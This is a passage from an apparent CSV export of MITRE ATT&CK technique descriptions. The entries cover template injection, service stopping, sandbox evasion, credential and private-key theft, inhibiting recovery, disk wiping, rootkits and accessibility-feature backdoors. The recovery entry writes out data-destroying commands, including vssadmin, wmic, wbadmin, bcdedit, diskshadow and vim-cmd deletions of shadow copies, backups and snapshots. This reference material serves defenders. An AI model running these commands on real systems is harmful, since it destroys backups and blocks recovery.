This is very similar to [Thread Local Storage](https://attack.mitre.org/techniques/T1055/005) but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process.",Windows,FALSE,FALSE,2020-01-14T17:21:54Z
attack-pattern--dc31fe1e-d722-49da-8f5f-92c7b5aff534,8,T1221,Template Injection,"Adversaries may create or modify references in user document templates to conceal malicious code or force authentication attempts. For example, Microsoft’s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered.(Citation: Microsoft Open XML July 2017)

Properties within parts may reference shared public resources accessed via online URLs. For example, template properties may reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.

Adversaries may abuse these templates to initially conceal malicious code to be executed via user documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded.(Citation: SANS Brian Wiltse Template Injection) These documents can be delivered via other techniques such as [Phishing](https://attack.mitre.org/techniques/T1566) and/or [Taint Shared Content](https://attack.mitre.org/techniques/T1080) and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched.(Citation: Redxorblue Remote Template Injection) Examples have been seen in the wild where template injection was used to load malicious code containing an exploit.(Citation: MalwareBytes Template Injection OCT 2017)

Adversaries may also modify the <code>*\template</code> control word within an .rtf file to similarly conceal then download malicious code. This legitimate control word value is intended to be a file destination of a template file resource that is retrieved and loaded when an .rtf file is opened. However, adversaries may alter the bytes of an existing .rtf file to insert a template control word field to include a URL resource of a malicious payload.(Citation: Proofpoint RTF Injection)(Citation: Ciberseguridad Decoding malicious RTF files)

This technique may also enable [Forced Authentication](https://attack.mitre.org/techniques/T1187) by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt.(Citation: Anomali Template Injection MAR 2018)(Citation: Talos Template Injection July 2017)(Citation: ryhanson phishery SEPT 2016)",Windows,FALSE,FALSE,2018-10-17T00:14:20Z
attack-pattern--0c4b4fda-9062-47da-98b9-ceae2dcf052a,7,T1213.002,Sharepoint,"Adversaries may leverage the SharePoint repository as a source to mine valuable information. SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems. For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint:

* Policies, procedures, and standards
* Physical / logical network diagrams
* System architecture diagrams
* Technical system documentation
* Testing / development credentials (i.e., [Unsecured Credentials](https://attack.mitre.org/techniques/T1552))
* Work / project schedules
* Source code snippets
* Links to network shares and other internal resources
","Office Suite, Windows",FALSE,FALSE,2020-02-14T13:35:32Z
attack-pattern--143c0cbb-a297-4142-9624-87ffc778980b,7,T1560.003,Archive via Custom Method,"An adversary may compress or encrypt data that is collected prior to exfiltration using a custom method. Adversaries may choose to use custom archival methods, such as encryption with XOR or stream ciphers implemented with no external library or utility references. Custom implementations of well-known compression algorithms have also been used.(Citation: ESET Sednit Part 2)","Linux, macOS, Windows",FALSE,FALSE,2020-02-20T21:09:55Z
attack-pattern--19401639-28d0-4c3c-adcc-bc2ba22f6421,7,T1588.004,Digital Certificates,"Adversaries may buy and/or steal SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner.

Adversaries may purchase or steal SSL/TLS certificates to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or even enabling [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) if the certificate is trusted or otherwise added to the root of trust (i.e. [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)). The purchase of digital certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal certificate materials directly from a compromised third-party, including from certificate authorities.(Citation: DiginotarCompromise) Adversaries may register or hijack domains that they will later purchase an SSL/TLS certificate for.

Certificate authorities exist that allow adversaries to acquire SSL/TLS certificates, such as domain validation certificates, for free.(Citation: Let's Encrypt FAQ)

After obtaining a digital certificate, an adversary may then install that certificate (see [Install Digital Certificate](https://attack.mitre.org/techniques/T1608/003)) on infrastructure under their control.",PRE,FALSE,FALSE,2020-10-01T02:14:18Z
attack-pattern--20fb2507-d71c-455d-9b6d-6104461cf26b,7,T1489,Service Stop,"Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment.(Citation: Talos Olympic Destroyer 2018)(Citation: Novetta Blockbuster) 

Adversaries may accomplish this by disabling individual services of high importance to an organization, such as <code>MSExchangeIS</code>, which will make Exchange content inaccessible.(Citation: Novetta Blockbuster) In some cases, adversaries may stop or disable many or all services to render systems unusable.(Citation: Talos Olympic Destroyer 2018) Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct [Data Destruction](https://attack.mitre.org/techniques/T1485) or [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) on the data stores of services like Exchange and SQL Server, or on virtual machines hosted on ESXi infrastructure.(Citation: SecureWorks WannaCry Analysis)(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)

Threat actors may also disable or stop service in cloud environments. For example, by leveraging the `DisableAPIServiceAccess` API in AWS, a threat actor may prevent the service from creating service-linked roles on new accounts in the AWS Organization.(Citation: Datadog Security Labs Cloud Persistence 2025)(Citation: AWS DisableAWSServiceAccess)","ESXi, IaaS, Linux, macOS, Windows",FALSE,FALSE,2019-03-29T19:00:55Z
attack-pattern--29be378d-262d-4e99-b00d-852d573628e6,7,T1497.001,System Checks,"Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)

Specific checks will vary based on the target and/or adversary, but may involve behaviors such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047), [PowerShell](https://attack.mitre.org/techniques/T1059/001), [System Information Discovery](https://attack.mitre.org/techniques/T1082), and [Query Registry](https://attack.mitre.org/techniques/T1012) to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. 

Checks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. Once executed, malware may also use [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) to check if it was saved in a folder or file with unexpected or even analysis-related naming artifacts such as `malware`, `sample`, or `hash`.

Other common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions.(Citation: McAfee Virtual Jan 2017) In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. 
 
Hardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.(Citation: Unit 42 OilRig Sept 2018)","Linux, macOS, Windows",FALSE,FALSE,2020-03-06T20:57:37Z
attack-pattern--315f51f0-6b03-4c1e-bfb2-84740afb8e21,7,T1555.005,Password Managers,"Adversaries may acquire user credentials from third-party password managers.(Citation: ise Password Manager February 2019) Password managers are applications designed to store user credentials, normally in an encrypted database. Credentials are typically accessible after a user provides a master password that unlocks the database. After the database is unlocked, these credentials may be copied to memory. These databases can be stored as files on disk.(Citation: ise Password Manager February 2019)

Adversaries may acquire user credentials from password managers by extracting the master password and/or plain-text credentials from memory.(Citation: FoxIT Wocao December 2019)(Citation: Github KeeThief) Adversaries may extract credentials from memory via [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212).(Citation: NVD CVE-2019-3610)
 Adversaries may also try brute forcing via [Password Guessing](https://attack.mitre.org/techniques/T1110/001) to obtain the master password of a password manager.(Citation: Cyberreason Anchor December 2019)","Linux, macOS, Windows",FALSE,FALSE,2021-01-22T16:08:40Z
attack-pattern--3e6831b2-bf4c-4ae6-b328-2e7c6633b291,7,T1098.007,Additional Local or Domain Groups,"An adversary may add additional local or domain groups to an adversary-controlled account to maintain persistent access to a system or domain.

On Windows, accounts may use the `net localgroup` and `net group` commands to add existing users to local and domain groups.(Citation: Microsoft Net Localgroup)(Citation: Microsoft Net Group) On Linux, adversaries may use the `usermod` command for the same purpose.(Citation: Linux Usermod)

For example, accounts may be added to the local administrators group on Windows devices to maintain elevated privileges. They may also be added to the Remote Desktop Users group, which allows them to leverage [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) to log into the endpoints in the future.(Citation: Microsoft RDP Logons) Adversaries may also add accounts to VPN user groups to gain future persistence on the network.(Citation: Cyber Security News) On Linux, accounts may be added to the sudoers group, allowing them to persistently leverage [Sudo and Sudo Caching](https://attack.mitre.org/techniques/T1548/003) for elevated privileges. 

In Windows environments, machine accounts may also be added to domain groups. This allows the local SYSTEM account to gain privileges on the domain.(Citation: RootDSE AD Detection 2022)","Windows, macOS, Linux",FALSE,FALSE,2024-08-05T20:49:49Z
attack-pattern--5e4a2073-9643-44cb-a0b5-e7f4048446c7,7,T1217,Browser Information Discovery,"Adversaries may enumerate information about browsers to learn more about compromised environments. Data saved by browsers (such as bookmarks, accounts, and browsing history) may reveal a variety of personal information about users (e.g., banking sites, relationships/interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.(Citation: Kaspersky Autofill)

Browser information may also highlight additional targets after an adversary has access to valid credentials, especially [Credentials In Files](https://attack.mitre.org/techniques/T1552/001) associated with logins cached by a browser.

Specific storage locations vary based on platform and/or application, but browser information is typically stored in local files and databases (e.g., `%APPDATA%/Google/Chrome`).(Citation: Chrome Roaming Profiles)","Linux, macOS, Windows",FALSE,FALSE,2018-04-18T17:59:24Z
attack-pattern--60c4b628-4807-4b0b-bbf5-fdac8643c337,7,T1583.004,Server,"Adversaries may buy, lease, rent, or obtain physical servers that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, such as watering hole operations in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), enabling [Phishing](https://attack.mitre.org/techniques/T1566) operations, or facilitating [Command and Control](https://attack.mitre.org/tactics/TA0011). Instead of compromising a third-party [Server](https://attack.mitre.org/techniques/T1584/004) or renting a [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003), adversaries may opt to configure and run their own servers in support of operations. Free trial periods of cloud servers may also be abused.(Citation: Free Trial PurpleUrchin)(Citation: Freejacked) 

Adversaries may only need a lightweight setup if most of their activities will take place using online infrastructure. Or, they may need to build extensive infrastructure if they want to test, communicate, and control other aspects of their activities on their own systems.(Citation: NYTStuxnet)",PRE,FALSE,FALSE,2020-10-01T00:48:09Z
attack-pattern--774a3188-6ba9-4dc4-879d-d54ee48a5ce9,7,T1020,Automated Exfiltration,"Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection.(Citation: ESET Gamaredon June 2020) 

When automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) and [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).","Linux, macOS, Network Devices, Windows",FALSE,FALSE,2017-05-31T21:30:29Z
attack-pattern--92a78814-b191-47ca-909c-1ccfe3777414,7,T1072,Software Deployment Tools,"Adversaries may gain access to and use centralized software suites installed within an enterprise to execute commands and move laterally through the network. Configuration management and software deployment applications may be used in an enterprise network or cloud environment for routine administration purposes. These systems may also be integrated into CI/CD pipelines. Examples of such solutions include: SCCM, HBSS, Altiris, AWS Systems Manager, Microsoft Intune, Azure Arc, and GCP Deployment Manager.  

Access to network-wide or enterprise-wide endpoint management software may enable an adversary to achieve remote code execution on all connected systems. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.

SaaS-based configuration management services may allow for broad [Cloud Administration Command](https://attack.mitre.org/techniques/T1651) on cloud-hosted instances, as well as the execution of arbitrary commands on on-premises endpoints. For example, Microsoft Configuration Manager allows Global or Intune Administrators to run scripts as SYSTEM on on-premises devices joined to Entra ID.(Citation: SpecterOps Lateral Movement from Azure to On-Prem AD 2020) Such services may also utilize [Web Protocols](https://attack.mitre.org/techniques/T1071/001) to communicate back to adversary owned infrastructure.(Citation: Mitiga Security Advisory: SSM Agent as Remote Access Trojan)

Network infrastructure devices may also have configuration management tools that can be similarly abused by adversaries.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)

The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to access specific functionality.","Linux, macOS, Network Devices, SaaS, Windows",FALSE,FALSE,2017-05-31T21:30:57Z
attack-pattern--937e4772-8441-4e4a-8bf0-8d447d667e23,7,T1591,Gather Victim Org Information,"Adversaries may gather information about the victim's organization that can be used during targeting. Information about an organization may include a variety of details, including the names of divisions/departments, specifics of business operations, as well as the roles and responsibilities of key employees.

Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about an organization may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak)(Citation: SEC EDGAR Search) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",PRE,FALSE,FALSE,2020-10-02T16:27:02Z
attack-pattern--a01bf75f-00b2-4568-a58f-565ff9bf202b,7,T1069.001,Local Groups,"Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.

Commands such as <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscl . -list /Groups</code> on macOS, and <code>groups</code> on Linux can list local groups.","Linux, macOS, Windows",FALSE,FALSE,2020-03-12T19:29:21Z
attack-pattern--b0533c6e-8fea-4788-874f-b799cacc4b92,7,T1027.005,Indicator Removal from Tools,"Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.

A good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.","Linux, macOS, Windows",FALSE,FALSE,2020-03-19T21:27:32Z
attack-pattern--e7cbc1de-1f79-48ee-abfd-da1241c65a15,7,T1588.003,Code Signing Certificates,"Adversaries may buy and/or steal code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with.(Citation: Wikipedia Code Signing) Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.

Prior to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may purchase or steal code signing certificates for use in operations. The purchase of code signing certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal code signing materials directly from a compromised third-party.",PRE,FALSE,FALSE,2020-10-01T02:11:47Z
attack-pattern--f5d8eed6-48a9-4cdf-a3d7-d1ffa99c3d2a,7,T1490,Inhibit System Recovery,"Adversaries may delete or remove built-in data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) This may deny access to available backups and recovery options.

Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of [Data Destruction](https://attack.mitre.org/techniques/T1485) and [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) Furthermore, adversaries may disable recovery notifications, then corrupt backups.(Citation: disable_notif_synology_ransom)

A number of native Windows utilities have been used by adversaries to disable or delete system recovery features:

* <code>vssadmin.exe</code> can be used to delete all volume shadow copies on a system - <code>vssadmin.exe delete shadows /all /quiet</code>
* [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) can be used to delete volume shadow copies - <code>wmic shadowcopy delete</code>
* <code>wbadmin.exe</code> can be used to delete the Windows Backup Catalog - <code>wbadmin.exe delete catalog -quiet</code>
* <code>bcdedit.exe</code> can be used to disable automatic Windows recovery features by modifying boot configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no</code>
* <code>REAgentC.exe</code> can be used to disable Windows Recovery Environment (WinRE) repair/recovery options of an infected system
* <code>diskshadow.exe</code> can be used to delete all volume shadow copies on a system - <code>diskshadow delete shadows all</code> (Citation: Diskshadow) (Citation: Crytox Ransomware)

On network devices, adversaries may leverage [Disk Wipe](https://attack.mitre.org/techniques/T1561) to delete backup firmware images and reformat the file system, then [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529) to reload the device. Together this activity may leave network devices completely inoperable and inhibit recovery operations.

On ESXi servers, adversaries may delete or encrypt snapshots of virtual machines to support [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486), preventing them from being leveraged as backups (e.g., via ` vim-cmd vmsvc/snapshot.removeall`).(Citation: Cybereason)

Adversaries may also delete “online” backups that are connected to their network – whether via network storage media or through folders that sync to cloud services.(Citation: ZDNet Ransomware Backups 2020) In cloud environments, adversaries may disable versioning and backup policies and delete snapshots, database backups, machine images, and prior versions of objects designed to be used in disaster recovery scenarios.(Citation: Dark Reading Code Spaces Cyber Attack)(Citation: Rhino Security Labs AWS S3 Ransomware)","Containers, ESXi, IaaS, Linux, macOS, Network Devices, Windows",FALSE,FALSE,2019-04-02T13:54:43Z
attack-pattern--0af0ca99-357d-4ba1-805f-674fdfb7bef9,6,T1561.002,Disk Structure Wipe,"Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. 

Adversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.

On a network devices, adversaries may reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `format`.(Citation: format_cmd_cisco)

To maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)","Linux, macOS, Network Devices, Windows",FALSE,FALSE,2020-02-20T22:10:20Z
attack-pattern--0f20e3cb-245b-4a61-8a91-2d93f7cb0e9b,6,T1014,Rootkit,"Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information. (Citation: Symantec Windows Rootkits) 

Rootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor or [System Firmware](https://attack.mitre.org/techniques/T1542/001). (Citation: Wikipedia Rootkit) Rootkits have been seen for Windows, Linux, and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat Mac OSX Rootkit)

Rootkits that reside or modify boot sectors are known as [Bootkit](https://attack.mitre.org/techniques/T1542/003)s and specifically target the boot process of the operating system.","Linux, macOS, Windows",FALSE,FALSE,2017-05-31T21:30:26Z
attack-pattern--15dbf668-795c-41e6-8219-f0447c0e64ce,6,T1069,Permission Groups Discovery,"Adversaries may attempt to discover group and permission settings. This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions.

Adversaries may attempt to discover group permission settings in many different ways. This data may provide the adversary with information about the compromised environment that can be used in follow-on activity and targeting.(Citation: CrowdStrike BloodHound April 2018)","Containers, IaaS, Identity Provider, Linux, macOS, Office Suite, SaaS, Windows",FALSE,FALSE,2017-05-31T21:30:55Z
attack-pattern--16cdd21f-da65-4e4f-bc04-dd7d198c7b26,6,T1594,Search Victim-Owned Websites,"Adversaries may search websites owned by the victim for information that can be used during targeting. Victim-owned websites may contain a variety of details, including names of departments/divisions, physical locations, and data about key employees such as names, roles, and contact info (ex: [Email Addresses](https://attack.mitre.org/techniques/T1589/002)). These sites may also have details highlighting business operations and relationships.(Citation: Comparitech Leak)

Adversaries may search victim-owned websites to gather actionable information. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199) or [Phishing](https://attack.mitre.org/techniques/T1566)).

In addition to manually browsing the website, adversaries may attempt to identify hidden directories or files that could contain additional sensitive information or vulnerable functionality. They may do this through automated activities such as [Wordlist Scanning](https://attack.mitre.org/techniques/T1595/003), as well as by leveraging files such as sitemap.xml and robots.txt.(Citation: Perez Sitemap XML 2023)(Citation: Register Robots TXT 2015)",PRE,FALSE,FALSE,2020-10-02T16:51:50Z
attack-pattern--291ede6c-1473-454c-b614-5ac5ea63c987,6,T1686.003,Windows Host Firewall,"Adversaries may disable or modify the Windows host firewall to bypass controls limiting network usage. This can include disabling the Windows host firewall entirely, suppressing specific profiles (domain, private, public), or adding, deleting, and modifying firewall rules to allow or restrict traffic.(Citation: Nearest Neighbor Volexity)

Adversaries may perform these modifications through multiple mechanisms depending on the Windows operating system and access level. For example, adversaries may use command-line utilities (e.g., `netsh advfirewall` or PowerShell cmdlets like `Set-NetFirewallProfile`, `New-NetFirewallRule`), Windows Registry modifications (e.g., altering firewall states and rule configurations via registry keys), or the Windows Control Panel to modify firewall settings through the Windows Security interface.

By disabling or modifying Windows firewall services, adversaries may enable access to remote services, open ports for command and control traffic, or configure rules for further actions.",Windows,FALSE,FALSE,2026-04-14T22:54:05Z
attack-pattern--365be77f-fc0e-42ee-bac8-4faf806d9336,6,T1218.007,Msiexec,"Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).(Citation: Microsoft msiexec) The Msiexec.exe binary may also be digitally signed by Microsoft.

Adversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.(Citation: LOLBAS Msiexec)(Citation: TrendMicro Msiexec Feb 2018) Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the <code>AlwaysInstallElevated</code> policy is enabled.(Citation: Microsoft AlwaysInstallElevated 2018)",Windows,FALSE,FALSE,2020-01-24T14:38:49Z
attack-pattern--54b4c251-1f0e-4eba-ba6b-dbc7a6f6f06b,6,T1071.003,Mail Protocols,"Adversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. 

Protocols such as SMTP/S, POP3/S, and IMAP that carry electronic mail may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the email messages themselves. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.(Citation: FireEye APT28)","Linux, macOS, Network Devices, Windows",FALSE,FALSE,2020-03-15T16:21:45Z
attack-pattern--60b508a1-6a5e-46b1-821a-9f7b78752abf,6,T1552.004,Private Keys,"Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures.(Citation: Wikipedia Public Key Crypto) Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. 

Adversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code> on Windows. Adversary tools may also search compromised systems for file extensions relating to cryptographic keys and certificates.(Citation: Kaspersky Careto)(Citation: Palo Alto Prince of Persia)

When a device is registered to Entra ID, a device key and a transport key are generated and used to verify the device’s identity.(Citation: Microsoft Primary Refresh Token) An adversary with access to the device may be able to export the keys in order to impersonate the device.(Citation: AADInternals Azure AD Device Identities)

On network devices, private keys may be exported via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `crypto pki export`.(Citation: cisco_deploy_rsa_keys) 

Some private keys require a password or passphrase for operation, so an adversary may also use [Input Capture](https://attack.mitre.org/techniques/T1056) for keylogging or attempt to [Brute Force](https://attack.mitre.org/techniques/T1110) the passphrase off-line. These private keys can be used to authenticate to [Remote Services](https://attack.mitre.org/techniques/T1021) like SSH or for use in decrypting other collected files such as email.","Linux, macOS, Network Devices, Windows",FALSE,FALSE,2020-02-04T13:06:49Z
attack-pattern--671cd17f-a765-48fd-adc4-dad1941b1ae3,6,T1027.016,Junk Code Insertion,"Adversaries may use junk code / dead code to obfuscate a malware’s functionality. Junk code is code that either does not execute, or if it does execute, does not change the functionality of the code. Junk code makes analysis more difficult and time-consuming, as the analyst steps through non-functional code instead of analyzing the main code. It also may hinder detections that rely on static code analysis due to the use of benign functionality, especially when combined with [Compression](https://attack.mitre.org/techniques/T1027/015) or [Software Packing](https://attack.mitre.org/techniques/T1027/002).(Citation: ReasonLabs)(Citation: ReasonLabs Cyberpedia Junk Code)

No-Operation (NOP) instructions are an example of dead code commonly used in x86 assembly language. They are commonly used as the 0x90 opcode. When NOPs are added to malware, the disassembler may show the NOP instructions, leading to the analyst needing to step through them.(Citation: ReasonLabs)

The use of junk / dead code insertion is distinct from [Binary Padding](https://attack.mitre.org/techniques/T1027/001) because the purpose is to obfuscate the functionality of the code, rather than simply to change the malware’s signature.","Linux, macOS, Windows",FALSE,FALSE,2025-03-04T21:38:49Z
attack-pattern--70e52b04-2a0c-4cea-9d18-7149f1df9dc5,6,T1546.008,Accessibility Features,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.

Two common accessibility programs are <code>C:\Windows\System32\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\Windows\System32\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as ""sticky keys"", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)

Depending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012) debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.

For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\Windows\System32\utilman.exe</code>) may be replaced with ""cmd.exe"" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)

Other accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)(Citation: Narrator Accessibility Abuse)

* On-Screen Keyboard: <code>C:\Windows\System32\osk.exe</code>
* Magnifier: <code>C:\Windows\System32\Magnify.exe</code>
* Narrator: <code>C:\Windows\System32\Narrator.exe</code>
* Display Switcher: <code>C:\Windows\System32\DisplaySwitch.exe</code>
